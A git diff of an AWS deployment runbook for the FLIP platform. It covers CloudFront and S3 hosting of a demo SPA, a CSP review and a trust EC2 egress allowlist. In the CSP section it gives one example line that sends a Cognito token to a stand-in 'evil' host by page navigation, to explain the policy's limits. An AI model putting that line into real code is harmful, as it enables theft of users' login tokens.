@@ -187,7 +187,132 @@ the hub's env, and the claimed FL kit slot maps onto the matching SuperNode key
 
 The UI is served from S3 behind CloudFront at the canonical user-facing subdomain (`stag.flip.aicentre.co.uk` / `app.flip.aicentre.co.uk`). CloudFront also forwards `/api/*` to the ALB, using a backend-only `api.<subdomain>` DNS name that only CloudFront uses — trusts and users never see it. CloudFront is the only supported UI-hosting path; there is no legacy EC2 UI container or ALB UI target group to fall back to.
 
-**Subsequent UI deploys**: just `make deploy-ui PROD=stag|true` — builds the UI from the working tree, regenerates `window.js`, syncs to S3, invalidates CloudFront. No Terraform involved.
+**Subsequent UI deploys**: just `make deploy-ui PROD=stag|true` — builds the UI from the working tree, regenerates `window.js`, syncs to S3, invalidates CloudFront. No Terraform involved. `deploy-ui` syncs `dist/` to the bucket **root** with `--delete`, so it always excludes the `ark_demo/*` prefix — the real build's `dist/` has no `ark_demo/` output, and without the exclude a routine UI (or `deploy-centralhub`, which calls `deploy-ui` as its last step) deploy would delete the demo SPA on every run. Publishing the demo bundle itself is a separate target — see below.
+
+### Ark+ demo SPA bundle (`/ark_demo/*`)
+
+`make deploy-ark-demo PROD=stag|true` builds the demo bundle (`npm run build:demo`, which also
+regenerates `dist/js/window.js` via `generate-demo-window-js.sh`) and syncs it to the **same**
+`FLIP_UI_BUCKET_NAME` bucket, under the `ark_demo/` prefix, then invalidates `/ark_demo/*` only.
+It mirrors `deploy-ui`'s cache-control discipline — immutable, far-future `Cache-Control` for the
+hashed `static/` chunks (the demo build's `assetsDir`, see the Vite `assetsDir` note below),
+`no-cache` for `index.html` and `js/window.js` — because the `/ark_demo/*` CloudFront behaviour
+uses the `CachingOptimized` policy, which **honours** origin cache-control headers: a hand-upload
+without them would serve a stale `index.html` referencing already-deleted hashed chunks after the
+next demo redeploy. This is a separate command from `deploy-ui` deliberately — the demo (a
+point-in-time snapshot — see "`/ark_demo/*` origin isolation" below) is republished far less often
+than the real app, typically only when the register is re-captured.
+
+```bash
+cd deploy/providers/AWS
+make deploy-ark-demo PROD=stag|true
+```
+
+### Ark+ demo download assets (`/ark_demo/assets/*`)
+
+The public Ark+ demo (flip-ui `npm run build:demo`) offers multi-hundred-MB result and model-file
+zips for download. These are served by the **same CloudFront distribution** at `/ark_demo/assets/*`
+from a dedicated S3 bucket (prod: `flipprod-demo-assets`) that is **not public**: CloudFront reads
+it via OAC exactly like the flip-ui bucket, all four public-access blocks are on, and the bucket
+policy grants `s3:GetObject` on the `ark_demo/assets/*` prefix to this distribution only. Serving
+through CloudFront (instead of the public-prefix S3 URL the demo used pre-rollout) puts the WAF
+rate-limit rule in the download path and moves anonymous egress from raw S3 rates to CloudFront's.
+
+The bucket itself is intentionally **not Terraform-managed** — bundles are staged manually per demo
+release and the bucket must survive `make destroy`. Terraform manages only the access edges
+(public-access block, OAC bucket policy, CloudFront origin + behaviour), all gated on
+`DEMO_ASSETS_BUCKET_NAME` in `.env.production` (leave unset on stag — no demo, no resources).
+
+Rollout / new-bundle staging:
+
+```bash
+# Stage bundles under the prefix the CloudFront behaviour maps to
+aws s3 cp s3://flipprod-demo-assets/ark_demo/<bundle>.zip \
+          s3://flipprod-demo-assets/ark_demo/assets/<bundle>.zip --profile prod   # server-side copy
+
+# DEMO_ASSETS_BUCKET_NAME=flipprod-demo-assets in .env.production, then:
+cd deploy/providers/AWS
+make plan PROD=true    # expect: +OAC, +PAB, +bucket policy, ~distribution (origin + behaviour)
+make apply PROD=true
+
+# Verify: CloudFront serves, raw S3 is sealed
+curl -sI https://app.flip.aicentre.co.uk/ark_demo/assets/<bundle>.zip   # 200
+curl -sI https://flipprod-demo-assets.s3.eu-west-2.amazonaws.com/ark_demo/<bundle>.zip  # 403
+```
+
+The demo UI's download URLs live in `flip-ui/src/demo/bootstrap.ts` (model-files zips) and
+`flip-ui/mocks/demo/data/*flres*.json` / `fl_results.json` (results zips); keep them **relative**
+(`/ark_demo/assets/…`), not absolute to `app.flip.aicentre.co.uk` — the demo SPA is always served
+same-origin under `/ark_demo/`, so a relative path resolves through CloudFront identically
+wherever the bundle is hosted (prod, stag, or a local preview), and it survives a domain change.
+An absolute form would silently point a stag-hosted or locally-previewed demo's downloads at prod.
+
+#### `/ark_demo/*` same-origin hosting (and its residual risk)
+
+The demo SPA itself (everything under `/ark_demo/` that isn't a downloadable bundle — the built
+`flip-ui` demo bundle, uploaded to the **same** `FLIP_UI_BUCKET_NAME` bucket under an `ark_demo/`
+prefix) shares an origin with the real, authenticated app. That means a real signed-in user's
+Cognito tokens in `localStorage` are reachable by any JS running under `app.flip.aicentre.co.uk` —
+including a hypothetical script-injection bug in the demo bundle. Rather than move the demo to a
+separate subdomain, it is served behind a dedicated, **enforcing** (not report-only)
+`aws_cloudfront_response_headers_policy.ark_demo_spa` attached only to the `/ark_demo/*` behaviour.
+
+> **This CSP is defence in depth, not an origin boundary.** An earlier version of this section
+> claimed `connect-src 'none'` meant a leaked token had "nowhere on the network to go". That is not
+> correct and was fixed in review (FLIP#794): **CSP has no directive governing top-level
+> navigation** — `navigate-to` was dropped from CSP3 and ships in no browser, and `form-action`
+> covers form submission only — so `location.href = "https://evil/?t=" + token` is unaffected by
+> this policy. Same-origin hosting also grants the demo full read access to the real app's
+> `localStorage` and cookies regardless of any CSP; `connect-src` constrains where a page may
+> *connect*, not what it may *read*.
+>
+> **The residual risk is real and accepted.** What keeps it closed today is that the demo has no
+> injection sink (no `v-html`/`innerHTML` outside a test file) and serves a static register compiled
+> into the bundle rather than attacker-supplied input — not the CSP. **A separate origin (e.g.
+> `demo.flip.aicentre.co.uk`) is the only control that genuinely separates the two token stores.**
+> Treat moving to one as the fix if the demo ever grows a dynamic content path.
+
+What the policy *does* buy is worth keeping: it blocks the entire fetch/XHR/WebSocket exfiltration
+class and every third-party resource load, and it enforces the "zero egress" property the demo
+design rests on. The demo's Mirage mock server never touches the real browser network stack (it
+replaces `XMLHttpRequest`/`fetch` outright), so this costs no demo functionality — confirmed by the
+original PR's Chrome net-log audit and pinned by the `zero egress` cases in
+`flip-ui/mocks/__tests__/demo-server.spec.ts`.
+
+Note the demo enforces `style-src 'self'` while the real app still runs that policy report-only, and
+CodeMirror injects an inline `<style>` at runtime on the cohort-query page — worth an eyeball on
+that page before a public launch.
+
+Three ordered behaviours now exist for the demo, evaluated in this precedence order (CloudFront
+uses the first `path_pattern` match, so order matters):
+1. `/api/*` → ALB (existing, real-app API)
+2. `/ark_demo/assets/*` → `flipprod-demo-assets` bucket (download bundles, no CSP — direct file
+   downloads, not HTML)
+3. `/ark_demo/*` → `flip-ui` bucket, same origin as the real app but with the strict demo CSP above
+
+The shared `spa_rewrite` CloudFront Function (attached to both the default behaviour and
+`/ark_demo/*`) is prefix-aware: a deep link under `/ark_demo/` falls back to `/ark_demo/index.html`,
+never the real app's `/index.html` — the earlier version would have silently served the real
+(Cognito-gated) app for a demo URL.
+
+If `ark_demo_spa` ever gets detached from the `/ark_demo/*` behaviour (Terraform drift, a future
+refactor), that hardening vanishes with **no functional symptom**, since the demo works identically
+without it. `make deploy-ark-demo` now refuses to publish when `DEMO_ASSETS_BUCKET_NAME` is unset or
+when the live distribution has no `/ark_demo/*` behaviour — the variable gates both the behaviour
+and its CSP, and without it the demo would be served by the *default* behaviour, whose CSP is only
+report-only. Still verify after a (re)deploy, alongside the 200/403 pair above:
+
+```bash
+curl -sI https://app.flip.aicentre.co.uk/ark_demo/ | grep -i content-security-policy   # expect: connect-src 'none' present
+```
+
+**Vite `assetsDir` collision (already fixed, worth knowing about):** Vite's default `assetsDir`
+(`"assets"`) would put the demo bundle's own JS/CSS/font chunks at `/ark_demo/assets/*.js`, which
+collides with behaviour 2 above — that behaviour would intercept the bundle's own asset requests
+and serve them (wrongly, 403) from the downloads bucket instead of the `flip-ui` bucket, breaking
+the app before Vue mounts. `flip-ui/vite.config.mts` sets `assetsDir: "static"` for `--mode demo`
+specifically to avoid this; the real build is unaffected (still `dist/assets`). If the demo build
+config ever changes, re-check that its own output prefix doesn't re-collide with `ark_demo/assets/`.
 
 ### FLIP application S3 buckets
 
@@ -264,7 +389,7 @@ aws s3 rb s3://flipstag
 Two stag-specific watch-outs:
 
 - **`make import-persistent` failing partway through** is fine on a re-run — every import in `scripts/import-resources.sh` is idempotent (probes `terraform state list` before importing). The script will skip already-imported resources and only attempt the missing ones.
-- **The task definitions applied before `deploy-centralhub` need image tags from `.env.stag`** (`DOCKER_TAG`, `DOCKER_FL_TAG`) that exist in GHCR. Branch tags do **not** auto-build on push — trigger the relevant `docker_build_*` workflows via `workflow_dispatch` before applying a branch image tag (see [the build trigger note in CLAUDE.md](../../../CLAUDE.md#docker-image-builds-gated-on-tests-manual-trigger-for-branches)). These env-file tags are only Terraform's bootstrap defaults — day-to-day image deploys pin immutable `sha-<short7>` tags instead (see [Central Hub deploys and rollback](#central-hub-deploys-and-rollback-immutable-sha-tags)).
+- **The task definitions applied before `deploy-centralhub` need image tags from `.env.stag`** (`DOCKER_TAG`, `DOCKER_FL_TAG`) that exist in GHCR. Branch tags do **not** auto-build on push — trigger the relevant `docker_build_*` workflows via `workflow_dispatch` before applying a branch image tag. These env-file tags are only Terraform's bootstrap defaults — day-to-day image deploys pin immutable `sha-<short7>` tags instead (see [Central Hub deploys and rollback](#central-hub-deploys-and-rollback-immutable-sha-tags)).
 
 For a **future fresh prod or dev** account that needs the same migration, the flow is the stag runbook above minus step 1 (`make import-persistent` is only needed on environments with the stag-style state gap) and with `PROD=true` on every `make` call for prod (dev uses the separate `deploy/providers/AWS/dev/` Terraform root, no `PROD=` flag).
 
@@ -887,6 +1012,64 @@ Ports referenced internally only (no internet-facing ingress; reached only from 
 - **`FL_API_PORT`** — `fl-api-net-1` ECS task port. Cloud Map internal only; no LB and no external ingress.
 - **5432** — RDS PostgreSQL. Reachable only from the Central Hub bastion SG and the `flip-api` ECS task SG.
 - **Trust API** — no inbound port needed; trusts poll the hub outbound.
+
+### Trust EC2 egress allowlist (GHSA-8465)
+
+The trust EC2's security group (`module.trust_security_group` in `main.tf`) sets
+`block_all_outbound = true` and an explicit `egress_rules` allowlist (`local.trust_egress_rules`) —
+previously it had no outbound restriction at all (`0.0.0.0/0`, every protocol/port, including
+DNS). Security groups can only match on CIDR, a peer security group, or an AWS-managed prefix
+list — never a hostname — so most destinations can only be expressed as a port.
+
+**Read the table below as a union, not as a set of per-destination controls.** A security group is
+a union of its rules: traffic is allowed if *any* rule matches. Because every hostname-less
+destination collapses onto `0.0.0.0/0:443`, the effective outbound policy is "**any destination on
+TCP 80, 443 and `FL_SERVER_PORT`, plus DNS to the VPC resolver — and nothing else**". Deleting the
+Hugging Face reason would not block Hugging Face, and the S3 prefix-list rule does not confine S3
+egress to that prefix list. Those narrower rules record intent — what the port is open *for*, and
+what would still have to work if the 443 floor were ever narrowed — and are shadowed by the floor
+today. The real, headline-worthy gain is the **port/protocol surface** (down from every port and
+every protocol to three TCP ports) plus **blocking third-party DNS resolvers**.
+
+**One row per AWS rule.** An EC2 security-group rule is identified by (direction, protocol, port
+range, destination); the description is a mutable annotation, not part of that key. Rules differing
+only by description are the *same* rule to AWS, so the Terraform emits one rule per tuple and
+enumerates the reasons in the last column. `egress_rules` carries a validation that fails the plan
+if two rules ever resolve to the same tuple again — the apply error it prevents
+(`InvalidPermission.Duplicate`) picks its winner nondeterministically under Terraform's default
+parallelism and never converges on re-runs.
+
+| Rule (protocol/port → destination) | Scope | What it carries, and why |
+|---|---|---|
+| TCP 443 → `0.0.0.0/0` | any host | Central Hub API (CloudFront) for trust-api polling; GHCR image pulls (fl-client / trust-api / imaging-api / data-access-api / orthanc); Docker Hub (grafana / loki / alloy); Hugging Face mock OMOP/Orthanc seeding (`make seed-trust-data`, part of the standard `deploy-trust` chain); `download.docker.com` (Docker Engine install/upgrade, `geerlingguy.docker`); `awscli.amazonaws.com` (one-time AWS CLI v2 install); Ubuntu apt + `esm.ubuntu.com` over HTTPS; **PyPI and `download.pytorch.org`** (documented trust requirement in `admin-platform-support.rst`; also Flower's per-run `uv sync`); the **CloudWatch agent `.deb`** from `s3.amazonaws.com/amazoncloudwatch-agent/…` — us-east-1 S3, *outside* the regional prefix list, so it survives only on this floor; and the AWS APIs with no VPC endpoint provisioned (`ssmmessages`, `ec2messages`, `monitoring`). |
+| TCP 80 → `0.0.0.0/0` | any host | Ubuntu apt mirrors over HTTP (package install/upgrade). |
+| TCP 443 → S3 managed prefix list | `com.amazonaws.<region>.s3` | S3, for the AI Centre FL kit sync. A prefix list rather than a raw CIDR because S3's edge IPs rotate. Shadowed by the 443 floor — intent, not enforcement. |
+| TCP 443 → `aws_security_group.vpc_endpoints` | peer SG | SSM control plane (`ssm`) and CloudWatch Logs (`logs`) via the VPC interface endpoints — one rule, since both share an endpoint SG and port. Shadowed by the 443 floor — intent, not enforcement. Gated on `var.enable_ecs_endpoints` (default `true`); when it is `false` the endpoints do not exist and this rule is omitted entirely rather than restated as a public rule, which would collide with the floor on the same tuple. |
+| TCP `FL_SERVER_PORT` → `0.0.0.0/0` | any host | FL training traffic to the FL-server NLB. **The one destination the 443 floor does not cover**, and therefore the one that cannot be scoped to a peer SG: the NLB is internet-facing (public subnets, no `internal = true`), so its DNS resolves to public IPs even from inside the VPC, and the trust EC2 (private subnet, no public IP) reaches it out through the NAT gateway — which is precisely what the NLB's own ingress rule allowlisting the NAT public IP attests. A peer-SG destination matches only the private IPs of ENIs carrying that SG, so it would match none of this traffic and silently drop every FL connection while image pulls, hub polling and SSM all stayed healthy. Narrowable only once the NLB itself becomes `internal`, or by giving it static per-AZ EIPs via `subnet_mapping` and allowlisting those `/32`s. |
+| TCP + UDP 53 → `cidrhost(var.vpc_cidr, 2)/32` | VPC resolver | Name resolution. **Inert as a control**: AWS documents that security groups cannot filter traffic to the Route 53 Resolver (the VPC+2 address / AmazonProvidedDNS), so these two rules neither permit nor restrict resolution — do not debug a DNS fault against them, and do not "fix" one by widening them. The control that actually satisfies #876's DNS criterion is the **absence** of a `0.0.0.0/0:53` rule, which *does* block third-party resolvers such as `8.8.8.8`. |
+
+**NTP is deliberately absent and needs no rule.** Time sync runs against the AMI's default
+link-local Amazon Time Sync service (`169.254.169.123`), which security groups do not evaluate. If
+anyone repoints chrony at a public NTP pool, the failure is silent clock drift surfacing weeks
+later as TLS / SigV4 / SSM errors — not as a firewall error.
+
+The `0.0.0.0/0`-scoped rules are the practical floor for a security-group-only design and are
+accepted as a permanent, documented limitation rather than a gap slated for a follow-up — closing
+them for real would mean a domain-aware layer (AWS Network Firewall domain rules, or a forward
+proxy), which is out of scope here. Even so, this is materially tighter than the previous
+allow-all-protocols-all-ports default.
+
+**Egress is managed inline; ingress by standalone rules.** `modules/secgroup` renders the allowlist
+into the `aws_security_group` resource's inline `egress` attribute and attaches no
+`aws_security_group_rule` of type `egress`. The asymmetry with ingress is deliberate and must not
+be "tidied away": inline `ingress`/`egress` are attributes-as-blocks, so an explicit value —
+including `[]` — is authoritative rather than unmanaged, and mixing it with standalone rule
+resources on the same group is the combination the AWS provider documents as causing "rule
+conflicts, perpetual differences, and rules being overwritten". In practice the plan immediately
+after such an apply revokes the entire allowlist, SSM access included, and never converges.
+Ingress keeps the opposite mechanism (standalone rules, the inline attribute never set), which is
+what lets externally attached rules — such as the CloudFront VPC-origin rule in `cloudfront.tf` —
+coexist safely.
 
 ### Remote Access via SSM Session Manager
 
